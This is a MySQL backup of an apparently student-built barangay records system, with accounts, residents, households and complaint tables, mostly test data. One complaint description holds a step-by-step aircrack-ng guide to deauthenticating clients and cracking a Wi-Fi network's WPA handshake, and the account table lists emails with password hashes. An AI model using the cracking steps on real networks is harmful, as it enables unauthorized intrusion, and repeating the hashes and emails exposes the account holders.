-- database backup - 2019-02-22 12:26:27
SET NAMES utf8;
SET sql_mode = 'NO_AUTO_VALUE_ON_ZERO';
SET foreign_key_checks = 0;
SET AUTOCOMMIT = 0;
START TRANSACTION;
DROP TABLE IF EXISTS `account`;

CREATE TABLE `account` (
  `account_id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `email` varchar(45) NOT NULL,
  `registered` date NOT NULL DEFAULT '0000-00-00',
  `status` int(11) NOT NULL DEFAULT '0',
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`account_id`),
  UNIQUE KEY `email` (`email`),
  UNIQUE KEY `username` (`username`),
  KEY `staff_id` (`user_id`),
  CONSTRAINT `account_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=62 DEFAULT CHARSET=latin1;
INSERT INTO `account` VALUES('41','admin','*4ACFE3202A5FF5CF467898FC58AAB1D615029441','jcmanabo@gmail.com','2019-02-01','0','1');
INSERT INTO `account` VALUES('45','staff','*CB9E9136A12A91A464CF6DC963F43DDE6A826B37','banez@gamil.com','2019-02-06','1','13');
INSERT INTO `account` VALUES('58','username','*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19','username@gmail.com','2019-02-21','0','9');
INSERT INTO `account` VALUES('59','viax30','*CF97C6FEDAD45FCF3A4A73DCE371B18B77B13565','viax30','2019-02-21','1','14');
INSERT INTO `account` VALUES('61','abante','*93AEE1F2BE1B87BFDEC1A54D2AA1E92E2EF00601','abante@gmail.com','2019-02-21','1','16');
DROP TABLE IF EXISTS `barangay`;

CREATE TABLE `barangay` (
  `barangay_id` int(11) NOT NULL AUTO_INCREMENT,
  `barangay_name` varchar(75) NOT NULL,
  PRIMARY KEY (`barangay_id`),
  UNIQUE KEY `barangay_name` (`barangay_name`)
) ENGINE=InnoDB AUTO_INCREMENT=26 DEFAULT CHARSET=latin1;
INSERT INTO `barangay` VALUES('25','aloran');
INSERT INTO `barangay` VALUES('24','Dulapo');
INSERT INTO `barangay` VALUES('22','Layawan');
INSERT INTO `barangay` VALUES('15','Mobod');
INSERT INTO `barangay` VALUES('17','Talairon');
INSERT INTO `barangay` VALUES('18','Talic');
INSERT INTO `barangay` VALUES('1','Tuyabang');
INSERT INTO `barangay` VALUES('20','Tuyabang Alto');
INSERT INTO `barangay` VALUES('21','Tuyabang Bajo');
DROP TABLE IF EXISTS `barangay_issue`;

CREATE TABLE `barangay_issue` (
  `issue_id` int(11) NOT NULL AUTO_INCREMENT,
  `complainant` int(11) NOT NULL,
  `complained_resident` int(11) NOT NULL,
  `date_of_filling` date NOT NULL,
  `officer_in_charge` int(11) NOT NULL,
  `status` varchar(20) NOT NULL,
  `Description` blob NOT NULL,
  PRIMARY KEY (`issue_id`),
  KEY `complainant` (`complainant`),
  KEY `complained_resident` (`complained_resident`),
  KEY `officer_in_charge` (`officer_in_charge`),
  CONSTRAINT `barangay_issue_ibfk_1` FOREIGN KEY (`complainant`) REFERENCES `person` (`person_id`),
  CONSTRAINT `barangay_issue_ibfk_2` FOREIGN KEY (`complained_resident`) REFERENCES `person` (`person_id`),
  CONSTRAINT `barangay_issue_ibfk_3` FOREIGN KEY (`officer_in_charge`) REFERENCES `account` (`account_id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=latin1;
INSERT INTO `barangay_issue` VALUES('2','96','91','2019-02-13','45','Ongoing','1. Log in as root\n2. airmon-ng\n	> to see the list of all the wireless cards if not then you can install wireless adapter\n3. airmon-ng start [wireless card name]\n	> put it into monitor mode\n4. airodump-ng [monitor interface]\n	> to see the list of all networks in the area and some information about them.\n	> press ctrl+c if you have spotted a victim\n5. airodump-ng -c [channel] --bssid [bssid] -w /root/Dekstop/ [monitor interface]\n	> -c 		channel of the target network	\n	> -bssid	bssid of the target network\n	_wait for some minutes allowing the airodump to capture more information about it.\n	\nLeave the airodump and open second terminal\n\n6. aireplay-ng -0 2 -a [router bssid] -c [client bssid] [monitor interface]	\n	> -0		shortcut for the death mode and 2 is number of death packets to send.\n	> -a 		router\'s bssid\n	> -c 		client\'s bssid which connected to the router\n\npress Enter if the four-handshake is successfull (found in the right top corner)\n\n7. aircrack-ng -a2 -b [router bssid] -w [path to wordlist ] /root/Desktop/*.cap\n	> -a 		method in aircrack to crack the handshake\n	> -b 		router\'s Bssid\n	> -w 		path of your wordlist\n	\nwait for aircrack to launch the attack.\n');
INSERT INTO `barangay_issue` VALUES('8','99','96','2019-02-19','45','Pending','');
INSERT INTO `barangay_issue` VALUES('9','107','99','2019-02-19','45','Pending','asdfasd');
INSERT INTO `barangay_issue` VALUES('10','98','96','2019-02-21','45','Pending','Nangawa of Lubi');
DROP TABLE IF EXISTS `household`;

CREATE TABLE `household` (
  `household_id` int(11) NOT NULL AUTO_INCREMENT,
  `street_id` int(11) NOT NULL,
  `household_number` int(10) NOT NULL,
  `date_accomplished` date NOT NULL,
  `account_id` int(11) NOT NULL,
  PRIMARY KEY (`household_id`),
  KEY `Date_Accomplished` (`account_id`),
  KEY `BS_ID` (`street_id`),
  CONSTRAINT `household_ibfk_1` FOREIGN KEY (`street_id`) REFERENCES `street` (`street_id`),
  CONSTRAINT `household_ibfk_2` FOREIGN KEY (`account_id`) REFERENCES `account` (`account_id`)
) ENGINE=InnoDB AUTO_INCREMENT=44 DEFAULT CHARSET=latin1;
INSERT INTO `household` VALUES('29','1','2','2019-01-09','45');
INSERT INTO `household` VALUES('31','3','242343','2019-02-18','45');
INSERT INTO `household` VALUES('32','3','242343','2019-02-18','45');
INSERT INTO `household` VALUES('33','3','1232321','2019-02-18','45');
INSERT INTO `household` VALUES('34','3','5','2019-02-18','45');
INSERT INTO `household` VALUES('35','3','43','2019-02-18','45');
INSERT INTO `household` VALUES('36','3','86','2019-02-18','45');
INSERT INTO `household` VALUES('37','3','34535','2019-02-18','45');
INSERT INTO `household` VALUES('39','3','123123','2019-02-18','58');
INSERT INTO `household` VALUES('40','3','6756','2019-02-18','45');
DROP TABLE IF EXISTS `person`;

CREATE TABLE `person` (
  `person_id` int(11) NOT NULL AUTO_INCREMENT,
  `last_name` varchar(75) NOT NULL,
  `first_name` varchar(75) NOT NULL,
  `middle_name` varchar(75) DEFAULT NULL,
  `extension` varchar(10) DEFAULT NULL,
  `house_number` char(20) NOT NULL,
  `birthplace` varchar(75) NOT NULL,
  `birthdate` date NOT NULL,
  `sex` varchar(6) NOT NULL,
  `civil_status` varchar(20) NOT NULL,
  `citizenship` varchar(25) NOT NULL,
  `occupation` varchar(75) NOT NULL,
  PRIMARY KEY (`person_id`),
  UNIQUE KEY `last_name` (`last_name`,`first_name`,`middle_name`,`extension`,`house_number`,`birthplace`,`birthdate`,`sex`,`civil_status`,`citizenship`,`occupation`)
) ENGINE=InnoDB AUTO_INCREMENT=111 DEFAULT CHARSET=latin1;
INSERT INTO `person` VALUES('99','h','a','h','h','h','h','2019-02-05','Male','Single','h','Student');
INSERT INTO `person` VALUES('102','h','aasdfasdf','h','h','h','h','2019-02-05','Male','Single','h','Student');
INSERT INTO `person` VALUES('98','h','asdfasdf','h','h','h','h','2019-02-05','Male','Single','h','Student');
INSERT INTO `person` VALUES('96','h','h','h','h','h','h','2019-02-05','Male','Single','h','Student');
INSERT INTO `person` VALUES('103','j','jJJjJjJjj','j','j','j','j','2019-02-08','Male','Single','jj','Student');
INSERT INTO `person` VALUES('76','Jabagat','Felix','Solis','','12-1231','MOPH','1990-02-06','Male','Single','Filipino','Teacher');
INSERT INTO `person` VALUES('107','k','kasdf','k','k','kk','k','2019-02-05','Male','Widowed','asdf','Student');
INSERT INTO `person` VALUES('106','k','kKKkkKKK123','k','k','k','asdfasdf','2019-02-01','Male','Widowed','Filipino','Student');
INSERT INTO `person` VALUES('79','Mañabo','John Cris','','II','242343','MOPH','2019-02-02','Male','Separated','Filipino','Student');
INSERT INTO `person` VALUES('81','Mañabo','John Ray','','II','242343','MOPH','2019-02-02','Male','Separated','Filipino','Student');
INSERT INTO `person` VALUES('82','Mañabo','John Ray','s','II','242343','MOPH','2019-02-02','Male','Separated','Filipino','Student');
INSERT INTO `person` VALUES('91','Mañabo','Kristine','s','II','242343','MOPH','2019-02-02','Male','Separated','Filipino','Student');
INSERT INTO `person` VALUES('94','Mañabo','Kristine Joy','s','II','242343','MOPH','2019-02-02','Male','Separated','Filipino','Student');
INSERT INTO `person` VALUES('75','Manabo','Concordia','Calamongay','','123-1232','MOPH','1997-02-19','Female','Single','Filipino','Student');
INSERT INTO `person` VALUES('77','Manabo','JOhn Cris','Calamongay','','123123','MOPH','2019-02-06','Female','Separated','Filipino','Teacher');
INSERT INTO `person` VALUES('74','Manabo','John Cris','Calamongay','II','123-1232','MOPH','2019-02-19','Male','Married','Filipino','Student');
DROP TABLE IF EXISTS `position`;

CREATE TABLE `position` (
  `position_id` int(11) NOT NULL AUTO_INCREMENT,
  `position` varchar(45) NOT NULL,
  PRIMARY KEY (`position_id`),
  UNIQUE KEY `position` (`position`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=latin1;
INSERT INTO `position` VALUES('12','BHW');
INSERT INTO `position` VALUES('3','Captain');
INSERT INTO `position` VALUES('8','Counsil');
INSERT INTO `position` VALUES('10','SK');
INSERT INTO `position` VALUES('11','Treasurer');
DROP TABLE IF EXISTS `residence_household`;

CREATE TABLE `residence_household` (
  `household_id` int(11) NOT NULL,
  `person_id` int(11) NOT NULL,
  KEY `Household_Id` (`household_id`),
  KEY `Person_Code` (`person_id`),
  CONSTRAINT `residence_household_ibfk_1` FOREIGN KEY (`household_id`) REFERENCES `household` (`household_id`),
  CONSTRAINT `residence_household_ibfk_2` FOREIGN KEY (`person_id`) REFERENCES `person` (`person_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
INSERT INTO `residence_household` VALUES('31','91');
INSERT INTO `residence_household` VALUES('32','94');
INSERT INTO `residence_household` VALUES('33','96');
INSERT INTO `residence_household` VALUES('34','98');
INSERT INTO `residence_household` VALUES('35','99');
INSERT INTO `residence_household` VALUES('36','102');
INSERT INTO `residence_household` VALUES('37','103');
DROP TABLE IF EXISTS `street`;

CREATE TABLE `street` (
  `street_id` int(11) NOT NULL AUTO_INCREMENT,
  `street_name` varchar(75) NOT NULL,
  `barangay_id` int(11) NOT NULL,
  PRIMARY KEY (`street_id`),
  UNIQUE KEY `street_name` (`street_name`,`barangay_id`),
  KEY `barangay_id` (`barangay_id`),
  CONSTRAINT `street_ibfk_1` FOREIGN KEY (`barangay_id`) REFERENCES `barangay` (`barangay_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=latin1;
INSERT INTO `street` VALUES('6','2','15');
INSERT INTO `street` VALUES('1','Purok 1','1');
INSERT INTO `street` VALUES('5','purok 1','18');
INSERT INTO `street` VALUES('2','Purok 1','22');
INSERT INTO `street` VALUES('3','Purok 2','15');
INSERT INTO `street` VALUES('4','sdgdf','25');
DROP TABLE IF EXISTS `user`;

CREATE TABLE `user` (
  `user_id` int(11) NOT NULL AUTO_INCREMENT,
  `last_name` varchar(75) NOT NULL,
  `first_name` varchar(75) NOT NULL,
  `middle_name` varchar(75) DEFAULT NULL,
  `gender` varchar(10) NOT NULL,
  `civil_status` varchar(20) NOT NULL,
  `citizenship` varchar(75) NOT NULL,
  `barangay_id` int(11) NOT NULL,
  `position_id` int(11) NOT NULL,
  PRIMARY KEY (`user_id`),
  KEY `Barangay_Code` (`barangay_id`,`position_id`),
  KEY `positionn_id` (`position_id`),
  CONSTRAINT `user_ibfk_2` FOREIGN KEY (`position_id`) REFERENCES `position` (`position_id`),
  CONSTRAINT `user_ibfk_3` FOREIGN KEY (`barangay_id`) REFERENCES `barangay` (`barangay_id`)
) ENGINE=InnoDB AUTO_INCREMENT=17 DEFAULT CHARSET=latin1;
INSERT INTO `user` VALUES('1','Mañabo','John','Calamongay','Male','Widowed','Philippines','21','3');
INSERT INTO `user` VALUES('8','Pocong','Christian','','Male','Single','Filipino','15','12');
INSERT INTO `user` VALUES('9','Pocong','Christian','','Male','Single','Filipino','15','12');
INSERT INTO `user` VALUES('10','Pocong','Christian','','Male','Single','Filipino','15','12');
INSERT INTO `user` VALUES('12','Diola','Rovel','','Male','Single','Filipino','15','12');
INSERT INTO `user` VALUES('13','Banez','Earl','Ambot','Female','Widowed','Filipino','15','10');
INSERT INTO `user` VALUES('14','inte','via','mira','Female','Widowed','filipino','25','3');
INSERT INTO `user` VALUES('15','inte','via','mira','Female','Widowed','filipino','25','3');
INSERT INTO `user` VALUES('16','Abante','Maureen','','Male','Single','Philippines','25','12');


COMMIT;